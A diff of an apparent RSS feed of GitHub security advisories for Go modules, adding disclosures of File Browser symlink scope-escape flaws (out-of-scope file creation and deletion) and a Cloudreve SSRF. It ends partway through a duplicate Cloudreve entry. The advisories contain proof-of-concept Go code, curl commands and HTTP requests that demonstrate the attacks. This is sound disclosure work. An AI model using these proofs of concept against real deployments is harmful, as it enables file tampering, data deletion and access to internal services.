@@ -2,7 +2,7 @@
 <feed xmlns="http://www.w3.org/2005/Atom">
     <id>https://azu.github.io/github-advisory-database-rss/go.rss</id>
     <title>Security Advisory for Go modules</title>
-    <updated>2026-07-20T20:59:03.689Z</updated>
+    <updated>2026-07-20T21:59:00.928Z</updated>
     <generator>github-advisory-database-rss</generator>
     <link rel="alternate" href="https://github.com/advisories?query=type%3Areviewed+ecosystem%3Ago"/>
     <subtitle>Security Advisory for Go modules on GitHub</subtitle>
@@ -11,6 +11,753 @@
     <category term="HIGH"/>
     <category term="MODERATE"/>
     <category term="LOW"/>
+    <entry>
+        <title type="html"><![CDATA[[github.com/filebrowser/filebrowser/v2] File Browser: ScopedFs follows a dangling symlink on write, letting a scoped user create files outside their scope]]></title>
+        <id>https://github.com/advisories/GHSA-8wc8-hf36-mjh9</id>
+        <link href="https://github.com/advisories/GHSA-8wc8-hf36-mjh9"/>
+        <updated>2026-07-20T21:17:44.000Z</updated>
+        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
+<p><code>ScopedFs</code> confines every File Browser user to a scope directory. Its <code>within()</code> guard is meant to reject any operation that follows a symbolic link out of that scope. When the link target does not exist yet, the guard walks up to the nearest existing ancestor and validates that instead. For a dangling symlink (target does not exist), the nearest existing ancestor is the in-scope directory containing the link, so the guard returns "in scope" and the subsequent <code>os.OpenFile(O_CREATE)</code> follows the link and creates the file at its out-of-scope target.</p>
+<p>A post-auth user with <code>Create</code> and <code>Modify</code> permission can write attacker-controlled content to any non-existent path outside their scope that the File Browser process can write to. The precondition is a dangling symlink present inside the user's scope, which is the same out-of-band precondition the rest of <code>ScopedFs</code> is built to defend against.</p>
+<p>This is a patch-gap variant of the GHSA-239w-m3h6-ch8v symlink confinement issue, not a resubmission of the already-published vulnerable-version behavior: GHSA-239w-m3h6-ch8v marks <code>&lt;= 2.63.13</code> vulnerable and <code>2.63.14</code> patched, while this proof reproduces on current <code>master</code> / <code>v2.63.15</code> (<code>be23ab3a15bf957928ecfed88de5ab67850c1b9c</code>). The escaping-symlink-to-an-existing-target case is defended and tested. The dangling case is neither, and the gap is acknowledged in a code comment as "best-effort".</p>
+<h2 id="root-cause">Root cause</h2>
+<p><code>files/scoped.go</code> (commit <code>be23ab3</code>). The guard, including the maintainer comment that already flags this exact gap:</p>
+<pre><code class="language-go">// Note: a dangling symlink whose target does not yet exist resolves to its
+// containing directory and is therefore allowed; writing through such a link
+// could still create a file outside the scope. This is treated as best-effort
+// and relies on rejecting existing escaping symlinks, which covers the
+// disclosure and overwrite vectors.
+func (s *ScopedFs) within(p string) (bool, error) {
+    root, err := filepath.EvalSymlinks(afero.FullBaseFsPath(s.base, "/"))
+    if err != nil {
+        return false, err
+    }
+
+    target := afero.FullBaseFsPath(s.base, p)
+    resolved, err := filepath.EvalSymlinks(target)
+    for errors.Is(err, fs.ErrNotExist) {
+        parent := filepath.Dir(target)   // LEXICAL parent of the link path
+        if parent == target {
+            break
+        }
+        target = parent
+        resolved, err = filepath.EvalSymlinks(target)
+    }
+    if err != nil {
+        return false, err
+    }
+    // ...
+    return resolved == root || strings.HasPrefix(resolved, prefix), nil
+}
+</code></pre>
+<p>When <code>p</code> is a symlink whose target does not exist, <code>EvalSymlinks(target)</code> returns <code>fs.ErrNotExist</code>. The loop takes the lexical parent of the link path (<code>filepath.Dir</code>), a real directory inside the scope, and <code>EvalSymlinks</code> of that resolves under the scope root. <code>within()</code> returns <code>true</code> and <code>guard()</code> permits the operation. The write then dereferences the link at the OS layer:</p>
+<pre><code class="language-go">func (s *ScopedFs) OpenFile(name string, flag int, perm os.FileMode) (afero.File, error) {
+    if err := s.guard(name); err != nil {   // returns nil for a dangling escaping symlink
+        return nil, err
+    }
+    return s.base.OpenFile(name, flag, perm) // os.OpenFile(O_CREATE) follows the link
+}
+</code></pre>
+<p>The assumption that breaks: <code>within()</code> treats "target does not exist" as "brand-new in-scope file" and validates the containing directory. But the path component being created is itself a symlink pointing outside the scope. <code>O_CREATE</code> follows it and creates the file at the link target, not inside the validated directory. The existing-target case is correctly blocked, because the walk-up resolves the link itself to an out-of-scope path. Only the dangling case slips through.</p>
+<p>For the layout below:</p>
+<pre><code class="language-text">/tmp/root/scope/escape -&gt; /tmp/root/outside/created-by-http.txt
+/tmp/root/outside/                      # exists
+/tmp/root/outside/created-by-http.txt   # does not exist yet
+</code></pre>
+<p><code>EvalSymlinks(/tmp/root/scope/escape)</code> returns not-exist, and the fallback validates <code>/tmp/root/scope</code>. The final <code>OpenFile</code> still follows <code>/tmp/root/scope/escape</code> and creates <code>/tmp/root/outside/created-by-http.txt</code>.</p>
+<h2 id="reachability-over-http">Reachability over HTTP</h2>
+<p>Endpoint: <code>POST /api/resources/&lt;linkname&gt;?override=true</code> (also <code>PUT</code>, and <code>POST/PATCH /api/tus/...</code>). Verified trace against the audited source:</p>
+<ol>
+<li><code>http/resource.go</code> <code>resourcePostHandler</code> requires <code>d.user.Perm.Create</code> (else 403).</li>
+<li><code>files.NewFileInfo</code> is called. For a dangling symlink, <code>stat()</code> in <code>files/file.go</code> does <code>LstatIfPossible</code> (sees the symlink, <code>err == nil</code>, <code>IsSymlink = true</code>), then <code>Fs.Stat</code> follows the link and fails with ENOENT, so the code returns the symlink <code>FileInfo</code> with <code>err == nil</code>. The handler therefore enters the "file exists" branch.</li>
+<li>The branch requires <code>override == "true"</code> and <code>d.user.Perm.Modify</code>, then proceeds.</li>
+<li><code>writeFile(d.user.Fs, r.URL.Path, r.Body, ...)</code> calls <code>afs.OpenFile(dst, os.O_RDWR|os.O_CREATE|os.O_TRUNC, fileMode)</code>.</li>
+<li><code>ScopedFs.OpenFile</code> runs <code>guard()</code>, which passes for the dangling link, then <code>os.OpenFile</code> follows the link and creates the file outside the scope with the request body as content.</li>
+</ol>
+<p>The TUS path (<code>http/tus_handlers.go</code> <code>tusPostHandler</code> -&gt; <code>OpenFile</code>, then <code>tusPatchHandler</code>) reaches the same sink.</p>
+<h3 id="why-existing-defenses-do-not-apply">Why existing defenses do not apply</h3>
+<ul>
+<li><code>afero.BasePathFs</code> lexical confinement only neutralizes <code>..</code>. A plain link name passes it unchanged.</li>
+<li><code>ScopedFs.within()</code> is the dedicated symlink defense, and it is the component that fails: the not-exist walk-up validates the link's parent directory instead of the link.</li>
+<li>The project's symlink tests (<code>http/tus_symlink_test.go</code> <code>TestTusHandlersRejectSymlinkScopeEscape</code>, <code>files/file_test.go</code>) only exercise escaping symlinks whose target exists. Those are blocked. The dangling variant is never tested, so the regression suite does not catch it.</li>
+</ul>
+<h2 id="proof-of-concept">Proof of concept</h2>
+<p>The PoC drives the real security boundary, <code>files.NewScopedFs</code>, with the same flags <code>http.writeFile</code> uses, and shows the write landing outside the scope. A control test shows the existing-target case is still blocked, proving the guard is real and the gap is specifically the dangling case.</p>
+<pre><code class="language-go">const writeFlags = os.O_RDWR | os.O_CREATE | os.O_TRUNC // == http.writeFile
+
+scope := filepath.Join(root, "user")      // the low-priv user's jail
+outside := filepath.Join(root, "outside") // sibling dir = another tenant / host path
+
+// Precondition: a dangling escaping symlink inside the scope.
+os.Symlink(filepath.Join(outside, "pwned.txt"), filepath.Join(scope, "evil")) // target does not exist yet
+
+fs := files.NewScopedFs(afero.NewOsFs(), scope)
+f, _ := fs.OpenFile("/evil", writeFlags, 0o644) // not rejected
+f.WriteString("OWNED-OUTSIDE-SCOPE")
+// assert: outside/pwned.txt must NOT exist
+</code></pre>
+<p>Observed result:</p>
+<pre><code class="language-text">=== RUN   TestDanglingSymlinkWriteEscapesScope
+    poc_test.go:49: VULNERABLE: write escaped the scope and created
+        /tmp/.../001/outside/pwned.txt with content "OWNED-OUTSIDE-SCOPE"
+--- FAIL: TestDanglingSymlinkWriteEscapesScope (0.00s)
+=== RUN   TestExistingTargetSymlinkIsBlocked
+    poc_test.go:78: guard correctly blocked existing-target escape: permission denied
+--- PASS: TestExistingTargetSymlinkIsBlocked (0.00s)
+</code></pre>
+<p>The dangling test "fails" by design: the assertion fires because the file escaped. The control test passes: an <code>escape_link -&gt; outside</code> (existing dir) write to <code>escape_link/injected.txt</code> is rejected by <code>OpenFile</code> with <code>permission denied</code> and nothing is created in <code>outside/</code>. That is exactly the scenario the project's own tests cover.</p>
+<p>End-to-end HTTP equivalent:</p>
+<pre><code class="language-text">POST /api/resources/escape?override=true
+X-Auth: &lt;token for user scoped to /tmp/root/scope with Create+Modify&gt;
+body: http-outside
+
+-&gt; ScopedFs.OpenFile("/escape", O_CREATE|O_TRUNC) follows the dangling link
+-&gt; file created at the link's out-of-scope target with the request body
+</code></pre>
+<p>The handler returns <code>200 OK</code>, and the outside file contains the uploaded body.</p>
+<h2 id="impact">Impact</h2>
+<ul>
+<li><strong>Direct primitive (live-verified):</strong> arbitrary file creation with attacker-controlled content at any non-existent path outside the user's scope that the File Browser process user can write to.</li>
+<li><strong>Cross-tenant integrity (source-reasoned):</strong> in multi-user deployments the scopes are sibling directories under one server root. A low-priv user can plant files into another user's home (a script, an HTML page later served, a config the victim trusts).</li>
+<li><strong>Persistence / RCE on permissive deployments (source-reasoned):</strong> creating a not-yet-existent <code>~/.ssh/authorized_keys</code> for the service account, a file under a web-served or later-executed directory, a cron or profile fragment. The official Docker image runs as non-root UID 1000, which bounds this to whatever that user owns. Bare-metal/systemd deployments that run File Browser as root raise this to host-level file write and RCE.</li>
+<li><strong>Scope limit (honest):</strong> this is file creation, not overwrite. Overwriting an existing out-of-scope file is genuinely blocked, because an existing target makes the link "escaping" and <code>within()</code> rejects it. The negative control confirms this.</li>
+</ul>
+<h2 id="suggested-remediation">Suggested remediation</h2>
+<p>For write/create/truncate operations, do not treat a dangling final symlink as safe merely because the nearest existing ancestor is inside the scope. The walk-up in <code>within()</code> should treat "the leaf is a symlink" as an escape candidate rather than validating its parent:</p>
+<ul>
+<li>In <code>guard()</code> / <code>within()</code>, <code>Lstat</code> the target. If it is a symlink, <code>Readlink</code> it, resolve the link target lexically (join with the link's directory, <code>Clean</code>), and require that target to be within the scope root, regardless of whether it currently exists.</li>
+<li>More robust: resolve path components one by one for the operation being attempted, or open the final component with <code>O_NOFOLLOW</code> (<code>unix.Openat(... O_NOFOLLOW)</code>) so creating through a symlink fails with <code>ELOOP</code>; or <code>fstat</code> the descriptor after opening and verify it resolves within the scope before writing.</li>
+</ul>
+<p>Add a regression test mirroring <code>TestTusHandlersRejectSymlinkScopeEscape</code> but with a dangling target (<code>os.Symlink(filepath.Join(outside, "newfile"), ...)</code>), asserting both a 4xx and that no file is created outside the scope.</p>
+<h2 id="references">References</h2>
+<ul>
+<li>Incomplete fix of CVE-2026-54094 / <code>GHSA-239w-m3h6-ch8v</code>.</li>
+<li>Affected code: <code>files/scoped.go</code> (<code>ScopedFs.within</code>, <code>ScopedFs.OpenFile</code>, <code>ScopedFs.Create</code>), reached from <code>http/resource.go</code> (<code>resourcePostHandler</code>, <code>writeFile</code>) and <code>http/tus_handlers.go</code>.</li>
+<li>Confirmed unpatched at <code>be23ab3a15bf957928ecfed88de5ab67850c1b9c</code> (<code>v2.63.15</code>).</li>
+</ul>
+<h3 id="references-1">References</h3>
+<ul>
+<li><a href="https://github.com/filebrowser/filebrowser/security/advisories/GHSA-8wc8-hf36-mjh9">https://github.com/filebrowser/filebrowser/security/advisories/GHSA-8wc8-hf36-mjh9</a></li>
+<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-55668">https://nvd.nist.gov/vuln/detail/CVE-2026-55668</a></li>
+<li><a href="https://github.com/filebrowser/filebrowser/commit/64511ce45e3be379e965f7f4fb0929a068d5bb81">https://github.com/filebrowser/filebrowser/commit/64511ce45e3be379e965f7f4fb0929a068d5bb81</a></li>
+<li><a href="https://github.com/filebrowser/filebrowser/releases/tag/v2.63.16">https://github.com/filebrowser/filebrowser/releases/tag/v2.63.16</a></li>
+<li><a href="https://github.com/advisories/GHSA-8wc8-hf36-mjh9">https://github.com/advisories/GHSA-8wc8-hf36-mjh9</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-8wc8-hf36-mjh9</uri>
+        </author>
+        <category label="severity" term="MODERATE"/>
+        <published>2026-07-20T21:17:43.000Z</published>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[github.com/filebrowser/filebrowser/v2] File Browser: Out-of-scope file deletion by a Create-only scoped user via symlink-following RemoveAll in upload failure-cleanup]]></title>
+        <id>https://github.com/advisories/GHSA-fmm7-x4gx-8jhr</id>
+        <link href="https://github.com/advisories/GHSA-fmm7-x4gx-8jhr"/>
+        <updated>2026-07-20T21:17:24.000Z</updated>
+        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
+<p>A scoped, non-admin File Browser user holding only the <strong>Create</strong> permission can delete arbitrary files outside their scope (other tenants' data, and the application's own database) via the upload failure-cleanup path. This is an incomplete fix of CVE-2026-54094: the v2.63.14 <code>ScopedFs</code> containment wrapper was applied to read/write/list/rename but NOT to the delete path. Confidentiality is preserved (reads stay blocked); integrity and availability are not.</p>
+<p><code>ScopedFs.RemoveAll</code> is the one dereferencing operation that skips the symlink <code>guard</code> every other method enforces. The direct-upload handler runs <code>RemoveAll</code> on the user-controlled path during failed-upload cleanup, gated only by <code>Perm.Create</code>. If an escaping directory symlink already exists inside the user's scope, an authenticated create-only user can delete an out-of-scope target, bypassing both the <code>ScopedFs</code> boundary and the <code>Perm.Delete</code> gate.</p>
+<p>Affected code: <a href="https://github.com/filebrowser/filebrowser/blob/be23ab3a15bf957928ecfed88de5ab67850c1b9c/http/resource.go#L172-L174">https://github.com/filebrowser/filebrowser/blob/be23ab3a15bf957928ecfed88de5ab67850c1b9c/http/resource.go#L172-L174</a></p>
+<h2 id="details">Details</h2>
+<p>CVE-2026-54094 was fixed by a <code>ScopedFs</code> afero wrapper whose <code>guard()</code> resolves every path component with <code>filepath.EvalSymlinks</code> and rejects out-of-scope targets. <code>guard()</code> is invoked on read, write, list, rename, stat, etc. The fix is incomplete; two gaps combine:</p>
+<ol>
+<li><code>ScopedFs.Remove</code> and <code>ScopedFs.RemoveAll</code> skip <code>guard()</code> (<code>files/scoped.go:138-144</code>) — they call <code>s.base.Remove/RemoveAll</code> directly, unlike every other method.</li>
+<li><code>resourcePostHandler</code> does not return on a <code>NewFileInfo</code> containment error (<code>http/resource.go:125-180</code>). For an out-of-scope path <code>NewFileInfo</code> fails, but the handler only uses that for the override branch (<code>if err == nil</code>) and falls through to <code>writeFile</code>, which is correctly guard-blocked and errors — triggering the failure-cleanup <code>_ = d.user.Fs.RemoveAll(r.URL.Path)</code> (<code>http/resource.go:173</code>) on the unvalidated path.</li>
+</ol>
+<p>Because Go's <code>os.RemoveAll</code> follows a symlinked ancestor, <code>RemoveAll("link/secret.txt")</code> where <code>link -&gt; /srv/victim</code> deletes <code>/srv/victim/secret.txt</code>, outside scope. The HTTP response is 403 (write blocked), masking the deletion.</p>
+<p>Of the three handlers calling <code>RemoveAll</code>, only <code>resourcePostHandler</code> is exploitable; <code>resourceDeleteHandler</code> (<code>:114</code>) and <code>tusDeleteHandler</code> (<code>:264</code>) return the <code>NewFileInfo</code> error first (shadowed, confirmed by negative controls). If the target is a directory, <code>RemoveAll</code> recursively removes out-of-scope contents.</p>
+<h2 id="precondition">Precondition</h2>
+<p>An escaping directory symlink must already exist inside the user's scope. File Browser exposes no symlink-creation API, so it is planted out of band (admin, mounted/shared volume, restored backup, extracted archive, another process). This is the same threat model accepted by CVE-2026-54094.</p>
+<h2 id="proof-of-concept">Proof of concept</h2>
+<p>Root <code>/tmp/fb-root</code>, a Create-only non-admin user scoped to <code>/scope</code> with <code>Perm.Create=true</code> (and <code>Perm.Delete=false</code> — the bug must not need it), and a pre-existing symlink <code>/tmp/fb-root/scope/link -&gt; /tmp/fb-out</code>:</p>
+<pre><code class="language-sh"># 0. Layout: server root + an out-of-scope dir holding the victim file
+mkdir -p /tmp/fb-root /tmp/fb-out
+echo keep &gt; /tmp/fb-out/victim.txt
+
+# 1. Init DB and pin the server root
+filebrowser -d /tmp/fb.db config init
+filebrowser -d /tmp/fb.db config set --root /tmp/fb-root
+
+# 2. Create a CREATE-ONLY, non-admin user scoped to /scope. perm.delete=false is the point: the bug must not need it
+filebrowser -d /tmp/fb.db users add victim hunter2 \
+  --scope=/scope \
+  --perm.admin=false --perm.create=true \
+  --perm.modify=false --perm.delete=false \
+  --perm.rename=false --perm.share=false --perm.execute=false
+
+# 3. Plant an escaping directory symlink inside the user's scope. Out-of-band, per the threat model
+#    (admin, mounted/shared volume, restored backup, another process). No FileBrowser API creates this.
+ln -s /tmp/fb-out /tmp/fb-root/scope/link
+
+# 4. Start the server
+filebrowser -d /tmp/fb.db -a 127.0.0.1 -p 8080
+
+# 5. Log in; the JWT is returned as the raw response body
+JWT=$(curl -s -X POST http://127.0.0.1:8080/api/login \
+  -H 'Content-Type: application/json' \
+  -d '{"username":"victim","password":"hunter2"}')
+
+# 6. Trigger: POST to a child of the symlink. The guarded write (MkdirAll/OpenFile) fails with 403,
+#    and failed-upload cleanup then runs the UNguarded RemoveAll("/link/victim.txt").
+curl -i -X POST -H "X-Auth: $JWT" --data 'x' \
+  'http://127.0.0.1:8080/api/resources/link/victim.txt'
+
+# 7. Impact check
+test ! -e /tmp/fb-out/victim.txt &amp;&amp; echo "IMPACT: out-of-scope victim.txt DELETED"
+</code></pre>
+<p>Minimal HTTP summary (Create-only user <code>carol</code>, scope <code>/attacker</code>, pre-existing symlink <code>/attacker/link -&gt; /srv/victim</code>, file <code>/srv/victim/secret.txt</code>):</p>
+<pre><code class="language-text">GET  /api/raw/link/secret.txt        -&gt; 403 (read containment still holds — the v2.63.14 fix)
+POST /api/resources/link/secret.txt  -&gt; 403 (write blocked)
+   =&gt; /srv/victim/secret.txt is DELETED (unguarded cleanup RemoveAll followed the symlinked ancestor)
+</code></pre>
+<p>Verified blast radius (per-case HTTP + on-disk before/after captured): create-only no-override deletion; cross-tenant deletion; full-instance DoS (delete the database dir → all users/shares/config gone, admin login fails); negative controls on the DELETE sinks (403, file survives).</p>
+<h2 id="impact">Impact</h2>
+<p>A per-tenant / per-share scoped user with only Create can destroy any file the File Browser process can reach via a symlink lexically inside their scope: other tenants' data or the application database (instance DoS). A create-only user deletes out-of-scope files reachable through an escaping symlinked directory, bypassing the <code>ScopedFs</code> boundary and the <code>Perm.Delete</code> gate. If the target is a directory, <code>RemoveAll</code> recursively removes out-of-scope contents. Precondition: a symlink present in the user's scope — identical to the parent CVE-2026-54094, which the project treated as in-scope, and which arises naturally via mounted volumes, restored backups, or extracted archives.</p>
+<h2 id="suggested-fix">Suggested fix</h2>
+<ol>
+<li>Add <code>guard()</code> to <code>ScopedFs.Remove</code> and <code>ScopedFs.RemoveAll</code> (<code>files/scoped.go</code>), mirroring the other methods (closes the class for all callers).</li>
+<li>Defense-in-depth: in <code>resourcePostHandler</code>, return early when <code>NewFileInfo</code> returns a non-not-exist error (do not fall through to <code>writeFile</code>/cleanup on a path that failed containment).</li>
+</ol>
+<h2 id="references">References</h2>
+<ul>
+<li>Incomplete fix of CVE-2026-54094 / <code>GHSA-239w-m3h6-ch8v</code>.</li>
+<li>Affected code: <code>files/scoped.go</code> (<code>ScopedFs.Remove</code>, <code>ScopedFs.RemoveAll</code>), reached from <code>http/resource.go</code> (<code>resourcePostHandler</code> failure-cleanup, line 173).</li>
+<li>Confirmed unpatched at HEAD <code>be23ab3</code> (<code>v2.63.15</code>); no open issue/PR addresses the <code>Remove</code>/<code>RemoveAll</code> gap.</li>
+</ul>
+<h3 id="references-1">References</h3>
+<ul>
+<li><a href="https://github.com/filebrowser/filebrowser/security/advisories/GHSA-fmm7-x4gx-8jhr">https://github.com/filebrowser/filebrowser/security/advisories/GHSA-fmm7-x4gx-8jhr</a></li>
+<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-55667">https://nvd.nist.gov/vuln/detail/CVE-2026-55667</a></li>
+<li><a href="https://github.com/filebrowser/filebrowser/blob/be23ab3a15bf957928ecfed88de5ab67850c1b9c/http/resource.go#L172-L174">https://github.com/filebrowser/filebrowser/blob/be23ab3a15bf957928ecfed88de5ab67850c1b9c/http/resource.go#L172-L174</a></li>
+<li><a href="https://github.com/advisories/GHSA-fmm7-x4gx-8jhr">https://github.com/advisories/GHSA-fmm7-x4gx-8jhr</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-fmm7-x4gx-8jhr</uri>
+        </author>
+        <category label="severity" term="HIGH"/>
+        <published>2026-07-20T21:17:24.000Z</published>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[github.com/cloudreve/Cloudreve/v3] Cloudreve: Non-admin remote download users can SSRF loopback/internal services and read imported responses]]></title>
+        <id>https://github.com/advisories/GHSA-x756-g4x3-c64m</id>
+        <link href="https://github.com/advisories/GHSA-x756-g4x3-c64m"/>
+        <updated>2026-07-20T21:16:54.000Z</updated>
+        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
+<p>Cloudreve's remote download workflow accepts user-supplied URLs and passes them to the configured downloader without blocking loopback, localhost, IPv6 localhost, or redirect-to-loopback targets.</p>
+<p>When the remote download permission is granted to a non-admin user group, a normal authenticated user can make the server-side downloader fetch internal-only URLs and then read the fetched response after it is imported into the user's own Cloudreve files.</p>
+<p>This does not affect default normal users unless the remote download permission is enabled for their group. However, the permission is a feature-level user-group capability and does not make the user an administrator.</p>
+<h2 id="attacker-requirements">Attacker requirements</h2>
+<p>The attacker must be:</p>
+<ul>
+<li>authenticated</li>
+<li>non-admin</li>
+<li>in a user group where <code>GroupPermissionRemoteDownload</code> is enabled</li>
+</ul>
+<p>Default normal users are blocked from the affected workflow. In the default install, only the admin group has the remote download permission, while the default <code>User</code> group does not.</p>
+<h2 id="affected-endpoint">Affected endpoint</h2>
+<pre><code class="language-http">POST /api/v4/workflow/download
+</code></pre>
+<p>Follow-up attacker readback was performed through normal workflow and file APIs:</p>
+<pre><code class="language-http">GET /api/v4/workflow?category=downloaded...
+GET /api/v4/file?uri=cloudreve://my...
+POST /api/v4/file/url
+</code></pre>
+<h2 id="root-cause">Root cause</h2>
+<p>The remote download workflow checks whether the user group has remote download permission, but it does not validate the submitted URL before passing it to the downloader.</p>
+<p>Relevant code paths:</p>
+<ul>
+<li><code>service/explorer/workflows.go:81</code></li>
+<li><code>pkg/filemanager/workflows/remote_download.go:202</code></li>
+<li><code>pkg/downloader/aria2/aria2.go:56</code></li>
+</ul>
+<p>The application does not block loopback, localhost, IPv6 localhost, or redirect targets resolving to internal addresses.</p>
+<h2 id="impact">Impact</h2>
+<p>A non-admin user with remote download permission can use Cloudreve as an SSRF primitive to access services reachable from the downloader environment.</p>
+<p>In my test, the attacker could fetch internal loopback URLs and read the response body after Cloudreve imported the downloaded content into the attacker's own files.</p>
+<p>Confirmed targets:</p>
+<ul>
+<li><code>http://127.0.0.1:7777/secret2</code></li>
+<li><code>http://localhost:7777/localsecret</code></li>
+<li><code>http://[::1]:7780/v6secret</code></li>
+<li>redirect to <code>http://127.0.0.1:7777/redirsecret</code></li>
+</ul>
+<p>This can expose internal HTTP services, loopback-only admin panels, local service metadata, or other network resources that are not directly reachable by the attacker.</p>
+<h2 id="reproduction">Reproduction</h2>
+<h3 id="1-permission-negative-control">1. Permission negative control</h3>
+<p>The attacker is a normal non-admin user in the default <code>User</code> group.</p>
+<p>Before enabling remote download for the group:</p>
+<pre><code class="language-http">POST /api/v4/workflow/download
+Content-Type: application/json
+
+{"src":["http://127.0.0.1:7777/secret"],"dst":"cloudreve://my"}
+</code></pre>
+<p>Response:</p>
+<pre><code class="language-json">{"code":40007,"msg":"Group not allowed to download files"}
+</code></pre>
+<h3 id="2-enable-only-remote-download-permission-for-the-non-admin-group">2. Enable only remote download permission for the non-admin group</h3>
+<p>The default install grants remote download to the admin group only. The default <code>User</code> group does not have it.</p>
+<p>Confirmed in:</p>
+<ul>
+<li><code>inventory/migration.go:154</code></li>
+<li><code>inventory/migration.go:179</code></li>
+</ul>
+<p>For this test, I only changed group 2 permissions from:</p>
+<pre><code class="language-text">hAg=
+</code></pre>
+<p>to:</p>
+<pre><code class="language-text">hAo=
+</code></pre>
+<p>The attacker remained in the <code>User</code> group and was not made admin. <code>GET /api/v4/user/me</code> still returned the group name as <code>User</code>.</p>
+<h3 id="3-start-an-internal-listener">3. Start an internal listener</h3>
+<p>Example listener on the Cloudreve host:</p>
+<pre><code class="language-text">127.0.0.1:7777
+</code></pre>
+<p>The listener returned a marker response:</p>
+<pre><code class="language-text">SSRF_SECRET_2_20260527
+</code></pre>
+<h3 id="4-queue-a-remote-download-to-loopback">4. Queue a remote download to loopback</h3>
+<pre><code class="language-http">POST /api/v4/workflow/download
+Content-Type: application/json
+
+{"src":["http://127.0.0.1:7777/secret2"],"dst":"cloudreve://my"}
+</code></pre>
+<p>Response:</p>
+<pre><code class="language-json">{"code":0,"data":[{"id":"OzH4","status":"queued","type":"remote_download"}]}
+</code></pre>
+<p>The internal listener received the request:</p>
+<pre><code class="language-text">127.0.0.1 - - [27/May/2026 13:00:46] "GET /secret2 HTTP/1.1" 200 -
+</code></pre>
+<p>Aria2 completed the download:</p>
+<pre><code class="language-text">Download complete: /home/b4r/cysec/cvehunting/cloudreve/data/temp/.../secret2
+</code></pre>
+<h3 id="5-read-the-imported-internal-response-as-the-attacker">5. Read the imported internal response as the attacker</h3>
+<p>The task completed successfully:</p>
+<pre><code class="language-json">{"id":"OzH4","status":"completed","summary":{"props":{"src_str":"http://127.0.0.1:7777/secret2","failed":0}}}
+</code></pre>
+<p>The attacker could list the imported file:</p>
+<pre><code class="language-json">{"name":"secret2","path":"cloudreve://my/secret2"}
+</code></pre>
+<p>The attacker could then download and read the response body:</p>
+<pre><code class="language-text">SSRF_SECRET_2_20260527
+</code></pre>
+<h2 id="additional-validated-variants">Additional validated variants</h2>
+<h3 id="localhost">localhost</h3>
+<p>Input:</p>
+<pre><code class="language-text">http://localhost:7777/localsecret
+</code></pre>
+<p>Attacker readback:</p>
+<pre><code class="language-text">LOCALHOST_SECRET_20260527
+</code></pre>
+<h3 id="redirect-to-loopback">Redirect to loopback</h3>
+<p>Input:</p>
+<pre><code class="language-text">http://127.0.0.1:7779/anything
+</code></pre>
+<p>Redirect:</p>
+<pre><code class="language-text">302 Location: http://127.0.0.1:7777/redirsecret
+</code></pre>
+<p>Attacker readback:</p>
+<pre><code class="language-text">REDIR_SECRET_20260527
+</code></pre>
+<h3 id="ipv6-localhost">IPv6 localhost</h3>
+<p>Input:</p>
+<pre><code class="language-text">http://[::1]:7780/v6secret
+</code></pre>
+<p>Attacker readback:</p>
+<pre><code class="language-text">IPV6_SECRET_20260527
+</code></pre>
+<h2 id="expected-behavior">Expected behavior</h2>
+<p>Cloudreve should reject remote download URLs that resolve to loopback, localhost, private network ranges, link-local ranges, metadata service ranges, or other internal-only targets unless explicitly allowed by an administrator.</p>
+<p>Redirect targets should be checked with the same policy.</p>
+<h2 id="actual-behavior">Actual behavior</h2>
+<p>Cloudreve accepts the URL, passes it to the downloader, imports the fetched internal response into the attacker's files, and allows the attacker to read it.</p>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/cloudreve/cloudreve/security/advisories/GHSA-x756-g4x3-c64m">https://github.com/cloudreve/cloudreve/security/advisories/GHSA-x756-g4x3-c64m</a></li>
+<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-54562">https://nvd.nist.gov/vuln/detail/CVE-2026-54562</a></li>
+<li><a href="https://github.com/cloudreve/cloudreve/commit/aaebf317a78f2413d74afd66c21a1f3143711312">https://github.com/cloudreve/cloudreve/commit/aaebf317a78f2413d74afd66c21a1f3143711312</a></li>
+<li><a href="https://github.com/cloudreve/cloudreve/releases/tag/4.16.1">https://github.com/cloudreve/cloudreve/releases/tag/4.16.1</a></li>
+<li><a href="https://github.com/advisories/GHSA-x756-g4x3-c64m">https://github.com/advisories/GHSA-x756-g4x3-c64m</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-x756-g4x3-c64m</uri>
+        </author>
+        <category label="severity" term="MODERATE"/>
+        <published>2026-07-20T21:16:51.000Z</published>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[github.com/cloudreve/Cloudreve/v4] Cloudreve: Non-admin remote download users can SSRF loopback/internal services and read imported responses]]></title>
+        <id>https://github.com/advisories/GHSA-x756-g4x3-c64m</id>
+        <link href="https://github.com/advisories/GHSA-x756-g4x3-c64m"/>
+        <updated>2026-07-20T21:16:54.000Z</updated>
+        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
+<p>Cloudreve's remote download workflow accepts user-supplied URLs and passes them to the configured downloader without blocking loopback, localhost, IPv6 localhost, or redirect-to-loopback targets.</p>
+<p>When the remote download permission is granted to a non-admin user group, a normal authenticated user can make the server-side downloader fetch internal-only URLs and then read the fetched response after it is imported into the user's own Cloudreve files.</p>
+<p>This does not affect default normal users unless the remote download permission is enabled for their group. However, the permission is a feature-level user-group capability and does not make the user an administrator.</p>
+<h2 id="attacker-requirements">Attacker requirements</h2>
+<p>The attacker must be:</p>
+<ul>
+<li>authenticated</li>
+<li>non-admin</li>
+<li>in a user group where <code>GroupPermissionRemoteDownload</code> is enabled</li>
+</ul>
+<p>Default normal users are blocked from the affected workflow. In the default install, only the admin group has the remote download permission, while the default <code>User</code> group does not.</p>
+<h2 id="affected-endpoint">Affected endpoint</h2>
+<pre><code class="language-http">POST /api/v4/workflow/download
+</code></pre>
